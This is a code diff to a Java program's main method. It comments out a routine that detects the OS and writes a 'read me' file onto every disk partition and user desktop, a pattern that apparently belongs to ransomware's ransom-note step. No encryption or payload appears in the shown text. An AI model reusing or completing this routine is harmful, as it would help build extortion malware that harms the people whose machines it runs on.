@@ -18,7 +18,7 @@ import java.util.ArrayList;
 
 public class Main {
     public static void main(String[] args) {
-        FileWriter operationFile = null;
+        /*FileWriter operationFile = null;
         // Get os
         String os = FunctionsHelper.getOs();
 
@@ -48,32 +48,36 @@ public class Main {
             // Create read me file
             try {
                 readMeFile.create(partition.getPath());
-            } catch (IOException ignored) {}
+            } catch (IOException ignored) {
+            }
 
         }
 
-        
+
         // Crete read me file in desktop
         ArrayList<File> desktops = files.getDesktops();
-        for (File desktop: desktops) {
+        for (File desktop : desktops) {
             System.out.println("desktop = " + desktop);
             try {
                 readMeFile.create(desktop.toString());
-            } catch (IOException ignored){}
+            } catch (IOException ignored) {
+            }
         }
 
         // Delete operation file
         try {
             operationFile.close();
             File file = new File(Constants.operationFileName);
-            while(!file.delete() && file.exists()) {
-                new Thread( () -> {
+            while (!file.delete() && file.exists()) {
+                new Thread(() -> {
                     try {
                         Thread.sleep(300000);
-                    } catch (InterruptedException ignored) {}
+                    } catch (InterruptedException ignored) {
+                    }
                 }).start();
             }
-        } catch (IOException ignored) {}
+        } catch (IOException ignored) {
+        }*/
 
         // Test
 //        File file = new File("tests/test.txt");
